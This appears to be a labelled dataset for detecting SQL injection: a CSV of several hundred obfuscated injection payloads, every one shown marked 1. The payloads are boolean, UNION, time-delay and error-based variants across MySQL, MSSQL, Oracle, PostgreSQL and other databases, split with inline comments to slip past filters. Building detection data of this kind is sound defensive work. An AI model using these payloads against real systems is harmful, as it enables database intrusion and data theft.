Query,Label
"-5391 o/**/r make_se/**/t  (  9354  =  9354,7185  )  # ptyy",1
"-5322"" un/**/ion all selec/**/t 6494,6494,6494,6494,6494,6494--",1
s/**/elect sleep  (  5  )   an/**/d    (    (     (  8354  =  8354,1
"1 a/**/nd elt  (  4249  =  4249,7259  )  -- meef",1
1' i/**/n boolean mode  )   o/**/r   (  sele/**/ct * fr/**/om   (  selec/**/t  (  sleep  (  5   )    )     )  ydpu  )  #,1
"1""  )   as ypfa w/**/here 6128  =  6128",1
1'+  (  se/**/lect plhk w/**/here 6540  =  6540,1
"-3102  )   uni/**/on all selec/**/t 6707,6707,6707,6707--",1
"1 a/**/nd 4241  =  convert  (  i/**/nt,  (  s/**/elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1
"-9634'   )    )     )   un/**/ion all selec/**/t 4141,4141#",1
"-5640""   )    )    o/**/r 9792  =  2728--",1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  sele/**/ct   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d 'ctac' l/**/ike 'ctac",1
-5764 o/**/r 3038  =  3038,1
sele/**/ct   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  se/**/lect 4996 f/**/rom master..sysda/**/tabases  )   end  )  --,1
"selec/**/t count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an/**/d   (  ""snwx"" li/**/ke ""snwx",1
1 u/**/nion all se/**/lect nul/**/l--,1
"sel/**/ect count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 a/**/nd    (    (   ""%""  =  """,1
1' whe/**/re 8159  =  8159 un/**/ion all sele/**/ct nu/**/ll#,1
"1""  )   as uuth wher/**/e 8555  =  8555 un/**/ion all sel/**/ect nu/**/ll,nul/**/l#",1
"-6194"" o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"sel/**/ect * f/**/rom generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   l/**/imit 1--",1
"call regexp_substri/**/ng  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
-4313%'  )   o/**/r 6872  =  6872 a/**/nd   (  '%'  =  ',1
1'   )    )     )   a/**/nd 6969  =    (  selec/**/t 6969 fro/**/m pg_sleep  (  5   )    )    an/**/d    (    (     (  'eihl'  =  'eihl,1
selec/**/t   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  se/**/lect 3140 f/**/rom master..sysdataba/**/ses  )   end  )  --,1
"-9861' u/**/nion all selec/**/t 5710,5710,5710,5710,5710--",1
"1 wh/**/ere 8273  =  8273 un/**/ion all selec/**/t nu/**/ll,nul/**/l,nu/**/ll,n/**/ull,n/**/ull,n/**/ull,nul/**/l,nu/**/ll#",1
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""   )    )    as swix whe/**/re 2459  =  2459 o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1   )    )     )   a/**/nd   (  s/**/elect 9067 fr/**/om  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )   a/**/nd    (    (     (  8382  =  8382",1
1  )   as selm wher/**/e 5759  =  5759,1
"-6112""  )   u/**/nion all sele/**/ct 8203,8203,8203,8203,8203,8203,8203--",1
-8369  )   whe/**/re 7234  =  7234 o/**/rd/**/er b/**/y 1--,1
"1' o/**/r elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1""   )    )     )   un/**/ion all sel/**/ect n/**/ull,nul/**/l#",1
"1   )    )     )   an/**/d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,nul/**/l  )   a/**/nd    (    (     (  2997  =  2997",1
"se/**/lect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a/**/nd   (  ""%""  =  """,1
1'||  (  s/**/elect 'zqwd' whe/**/re 1647  =  1647 rlik/**/e sleep  (  5   )    )   ||',1
"1""   )    )     )    (  sele/**/ct   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fr/**/om   (  val/**/ues  (  0   )    )     )   a/**/nd    (    (     (  ""fcpm""  =  ""fcpm",1
1 wh/**/ere 2239  =  2239 a/**/nd 6969  =    (  s/**/elect 6969 fr/**/om pg_sleep  (  5   )    )   --,1
1'||  (  selec/**/t 'xemx' f/**/rom dual wh/**/ere 4683  =  4683 o/**/r sleep  (  5  )  #,1
se/**/lect   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  s/**/elect 4291 fro/**/m mysql.db  )   end  )  #,1
"1""  )   wher/**/e 8462  =  8462 a/**/nd up/**/datexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sele/**/ct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"-1055' un/**/ion all selec/**/t 7758,7758,7758,7758,7758,7758--",1
"-2630'   )    )    as xavw whe/**/re 6291  =  6291 uni/**/on all se/**/lect 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1
"1' wher/**/e 8451  =  8451 uni/**/on all sel/**/ect nu/**/ll,nu/**/ll,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,n/**/ull,nu/**/ll,n/**/ull#",1
1' wh/**/ere 8635  =  8635 o/**/rder b/**/y 1--,1
-8447 w/**/here 2850  =  2850 o/**/r 7147  =  3262,1
"1 a/**/nd elt  (  4249  =  4249,7259  )  ",1
"1%'   )    )    o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1"" whe/**/re 6179  =  6179",1
1'  )   w/**/here 6842  =  6842,1
"1'   )    )    as qzyp w/**/here 5081  =  5081 o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
-3937   )    )    o/**/r 3038  =  3038,1
"1%' o/**/r 8315  =    (  selec/**/t count  (  *  )   fr/**/om sysibm.systabl/**/es as t1,sysibm.syst/**/ables as t2,sysibm.systabl/**/es as t3  )   an/**/d '%'  =  '",1
1'+  (  sel/**/ect 'diet' whe/**/re 7004  =  7004 rli/**/ke sleep  (  5   )    )   +',1
1'  )   as cdrm wh/**/ere 4595  =  4595 o/**/r/**/der b/**/y 1#,1
"1""   )    )    as zbfj wh/**/ere 2285  =  2285",1
"1'  )   wher/**/e 4407  =  4407 a/**/nd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
1 an/**/d 4595  =  4595#,1
-9429'  )   o/**/rder b/**/y 1--,1
1%'   )    )    rl/**/ike   (  sele/**/ct   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a/**/nd    (    (   '%'  =  ',1
"1""   )    )    an/**/d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    a/**/nd    (    (   ""alkz""  =  ""alkz",1
s/**/elect   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  sele/**/ct 5152 f/**/rom mysql.db  )   end  )  #,1
"1%"" un/**/ion all se/**/lect n/**/ull,nul/**/l,n/**/ull,n/**/ull,nul/**/l,n/**/ull#",1
"1 o/**/r 5356  =    (  selec/**/t count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'   )    )     )   an/**/d 8514  =    (  sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )   a/**/nd    (    (     (  'peyy'  =  'peyy",1
"1  )   an/**/d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1  )   as zmjm wher/**/e 9125  =  9125 o/**/r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nu/**/ll  )  --",1
"-7802'   )    )     )   o/**/r elt  (  8778  =  9974,9974  )   a/**/nd    (    (     (  'glsq' li/**/ke 'glsq",1
1 o/**/r sleep  (  5  )  #,1
"1"" an/**/d elt  (  1210  =  1210,sleep  (  5   )    )    a/**/nd ""zhxm""  =  ""zhxm",1
"1   )    )    as myyh w/**/here 5116  =  5116 o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1',  (  sel/**/ect   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  s/**/elect 4209 fro/**/m i/**/nfo/**/rmation_schema.character_s/**/ets  )   end   )    )   ",1
1'  )   rl/**/ike   (  sel/**/ect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a/**/nd   (  'gzpx'  =  'gzpx,1
"1'  )   o/**/r   (  selec/**/t 2*  (  if   (    (   selec/**/t * fr/**/om   (  sel/**/ect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d   (  'bzgs' li/**/ke 'bzgs",1
"-2314""   )    )    o/**/r make_s/**/et  (  9354  =  9354,7185  )   an/**/d    (    (   ""uatq"" l/**/ike ""uatq",1
"sel/**/ect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a/**/nd   (  'dvpw'  =  'dvpw",1
"1'   )    )    as nxhp wh/**/ere 2649  =  2649 o/**/r 9643  =    (  sele/**/ct count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )  --",1
"-2287'   )    )    unio/**/n all s/**/elect 1200,1200,1200,1200,1200#",1
"-6184""   )    )    o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d    (    (   ""rovr""  =  ""rovr",1
selec/**/t   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  sele/**/ct 6002 fro/**/m mysql.db  )   end  )  #,1
1'||  (  sele/**/ct 'ywfo' fr/**/om dual w/**/here 4168  =  4168 rli/**/ke sleep  (  5  )  #,1
"1"" o/**/r 6793  =    (  selec/**/t 6793 fro/**/m pg_sleep  (  5   )    )    a/**/nd ""pwwb"" lik/**/e ""pwwb",1
"1%'   )    )     )    (  selec/**/t   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,n/**/ull  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fro/**/m   (  valu/**/es  (  0   )    )     )   an/**/d    (    (     (  '%'  =  '",1
"1""   )    )    an/**/d   (  sel/**/ect 2*  (  if   (    (   sele/**/ct * fro/**/m   (  se/**/lect concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (   ""llgb"" l/**/ike ""llgb",1
"-5202 unio/**/n all s/**/elect 5332,5332,5332,5332,5332,5332,5332#",1
"1""  )   an/**/d 6969  =    (  s/**/elect 6969 f/**/rom pg_sleep  (  5   )    )    a/**/nd   (  ""btht""  =  ""btht",1
"-6307' wh/**/ere 8916  =  8916 u/**/nion all selec/**/t 8916,8916,8916,8916,8916,8916,8916--",1
"1' i/**/n boolean mode  )   o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1
1   )    )    uni/**/on all selec/**/t nu/**/ll#,1
"-4955%' un/**/ion all sel/**/ect 5928,5928--",1
"1' a/**/nd elt  (  2266  =  7467,7467  )  ",1
1' an/**/d   (  s/**/elect * fro/**/m   (  se/**/lect  (  sleep  (  5   )    )     )  fzno  )   an/**/d 'mepp'  =  'mepp,1
"1,  (  s/**/elect   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  selec/**/t 3717 f/**/rom master..sysdata/**/bases  )   end   )    )   ",1
"1'  )   o/**/r elt  (  6272  =  6272,sleep  (  5   )    )    a/**/nd   (  'tmbs'  =  'tmbs",1
-4901  )   o/**/r 3407  =  6442#,1
1' wh/**/ere 4134  =  4134 a/**/nd 1102  =  6300--,1
"1'   )    )     )   a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sel/**/ect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a/**/nd    (    (     (  'hllf'  =  'hllf",1
"-1598""   )    )    o/**/r elt  (  5329  =  9628,9628  )   a/**/nd    (    (   ""hyxq"" li/**/ke ""hyxq",1
 (  sele/**/ct * fro/**/m   (  selec/**/t  (  sleep  (  5   )    )     )  srmq   )    )   +',1
"1""  )   o/**/r   (  selec/**/t * fro/**/m   (  se/**/lect  (  sleep  (  5   )    )     )  sddo  )  #",1
"-3604'  )   as fyev whe/**/re 7259  =  7259 uni/**/on all selec/**/t 7259,7259,7259,7259--",1
-6433%'   )    )    o/**/r 9323  =  9323#,1
-8836%'  )   o/**/r 4856  =  3891,1
"1 a/**/nd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'   )    )    o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   an/**/d    (    (   '%'  =  '",1
 (  7098  =  7098 a/**/nd sleep  (  5   )    ) ,1
"1""  )   as jiyl wh/**/ere 4893  =  4893 un/**/ion all sele/**/ct n/**/ull,nul/**/l,nul/**/l,nu/**/ll,nul/**/l#",1
-3243 o/**/r 2266  =  3583#,1
"1'  )   un/**/ion all se/**/lect nu/**/ll,nul/**/l,nu/**/ll,nul/**/l,nul/**/l--",1
"1%""   )    )     )   an/**/d 3202  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    an/**/d    (    (     (  ""%""  =  """,1
"1' a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sel/**/ect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    an/**/d 'pphf'  =  'pphf",1
"1""   )    )    rli/**/ke   (  se/**/lect * fr/**/om   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo  )   a/**/nd    (    (   ""bxct"" lik/**/e ""bxct",1
-9120'   )    )    o/**/r 8571  =  8571--,1
1'+  (  s/**/elect naiw w/**/here 4924  =  4924,1
-9389'  )   o/**/r 8859  =  3989--,1
"-9923%'   )    )     )   unio/**/n all se/**/lect 8985,8985,8985,8985,8985,8985,8985#",1
1'   )    )    a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (   'hbwk' li/**/ke 'hbwk,1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d   (  ""tgdu""  =  ""tgdu",1
"-1510'   )    )     )   un/**/ion all se/**/lect 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
"1""  )   unio/**/n all sele/**/ct n/**/ull,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,nul/**/l,nu/**/ll#",1
"elt  (  8192  =  8192,sleep  (  5   )    )   ",1
end an/**/d    (    (   'zeyr'  =  'zeyr,1
"1""   )    )    as luon w/**/here 4676  =  4676 rl/**/ike sleep  (  5  )  #",1
"1""  )   wh/**/ere 6138  =  6138 a/**/nd 8594  =    (  selec/**/t 8594 fro/**/m pg_sleep  (  5   )    )   --",1
"1"" whe/**/re 3740  =  3740 rl/**/ike sleep  (  5  )  #",1
"1'   )    )     )   a/**/nd elt  (  4249  =  4249,7259  )   an/**/d    (    (     (  'kgdt' l/**/ike 'kgdt",1
1  )   as tngy wher/**/e 8956  =  8956 rli/**/ke   (  s/**/elect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"-4230""   )    )     )   u/**/nion all selec/**/t 6962,6962,6962,6962,6962,6962#",1
-3540 w/**/here 7302  =  7302 o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1  )   as lfra wh/**/ere 2669  =  2669 a/**/nd updat/**/exml  (  3393,concat  (  0x2e,0x7171706a71,  (  sele/**/ct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
1'  )   rlik/**/e sleep  (  5  )   an/**/d   (  'qsub' l/**/ike 'qsub,1
"1%""   )    )     )   uni/**/on all se/**/lect n/**/ull,nul/**/l,nu/**/ll,nul/**/l,n/**/ull,n/**/ull,n/**/ull,nul/**/l--",1
"1'+  (  sele/**/ct 'uzaw' w/**/here 9900  =  9900 o/**/r 8315  =    (  s/**/elect count  (  *  )   fro/**/m sysibm.systa/**/bles as t1,sysibm.syst/**/ables as t2,sysibm.systa/**/bles as t3   )    )   +'",1
"1""  )   as dlfq wh/**/ere 8410  =  8410",1
"1  )   as guru whe/**/re 7615  =  7615 unio/**/n all sel/**/ect n/**/ull,nu/**/ll,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,nul/**/l,nu/**/ll,n/**/ull,nu/**/ll#",1
"1  )   an/**/d make_s/**/et  (  1559  =  4863,4863  )  ",1
-9484' o/**/r   (  7129  =  2349  )  *2349 an/**/d 'fcsa' li/**/ke 'fcsa,1
"1'  )   o/**/r   (  selec/**/t 9173 f/**/rom  (  selec/**/t count  (  *  )  ,concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  ",1
"1"" wher/**/e 5328  =  5328 a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""   )    )     )   u/**/nion all sel/**/ect nul/**/l,nu/**/ll,n/**/ull,nul/**/l,nu/**/ll,nu/**/ll,nu/**/ll#",1
1'  )   as ihsc w/**/here 3978  =  3978,1
"-6125'||  (  sele/**/ct 'hwnm' wher/**/e 1428  =  1428 u/**/nion all sele/**/ct 1428,1428,1428,1428,1428,1428#",1
se/**/lect   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as i/**/nt  )  /  (  sel/**/ect 0 fro/**/m dual  )   end  )   fr/**/om dual--,1
1 rli/**/ke   (  s/**/elect * fro/**/m   (  selec/**/t  (  sleep  (  5   )    )     )  sgvo  ) ,1
"1'   )    )    a/**/nd row  (  6237,7469  )  >  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fro/**/m   (  s/**/elect 5192 u/**/nion sel/**/ect 3785 unio/**/n sele/**/ct 3931 unio/**/n selec/**/t 7158  )  a group b/**/y x  )   a/**/nd    (    (   'pbtf'  =  'pbtf",1
"1'  )   wher/**/e 7391  =  7391 o/**/r   (  sele/**/ct 9173 fro/**/m  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  --",1
1'+  (  s/**/elect dklj wher/**/e 3265  =  3265,1
"1'  )   an/**/d 3202  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   ",1
"1'   )    )    a/**/nd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (   'cbwx'  =  'cbwx",1
-3422%'  )   o/**/r 5903  =    (  'qqpjq'||  (  selec/**/t case 5903 when 5903 then 1 else 0 end fro/**/m rdb$datab/**/ase  )  ||'qzvzq'  )   an/**/d   (  '%'  =  ',1
s/**/elect pg_sleep  (  5  )   an/**/d    (    (     (  9476  =  9476,1
"1 o/**/r row  (  1045,7562  )  >  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m   (  se/**/lect 8488 un/**/ion s/**/elect 5584 un/**/ion se/**/lect 3051 uni/**/on se/**/lect 1210  )  a group b/**/y x  )  -- fwzl",1
-3083  )   o/**/r 5221  =  7829,1
"1'   )    )    u/**/nion all se/**/lect nul/**/l,nul/**/l,nu/**/ll--",1
"1""  )   as vcvw w/**/here 2445  =  2445 an/**/d 8594  =    (  sel/**/ect 8594 fro/**/m pg_sleep  (  5   )    )   --",1
waitfo/**/r delay '0:0:5' a/**/nd    (    (     (  'ozjl' li/**/ke 'ozjl,1
"1%' o/**/r upda/**/texml  (  1808,concat  (  0x2e,0x7171706a71,  (  se/**/lect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   a/**/nd '%'  =  '",1
"1'   )    )    a/**/nd   (  sel/**/ect 2*  (  if   (    (   se/**/lect * fr/**/om   (  sel/**/ect concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (   'yzdp'  =  'yzdp",1
"-3411'   )    )     )   u/**/nion all sel/**/ect 3185,3185,3185,3185,3185,3185,3185,3185--",1
"-6254"" whe/**/re 8941  =  8941 o/**/r elt  (  1032  =  1032,3623  )  --",1
"1' an/**/d 3580  =    (  sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )  --",1
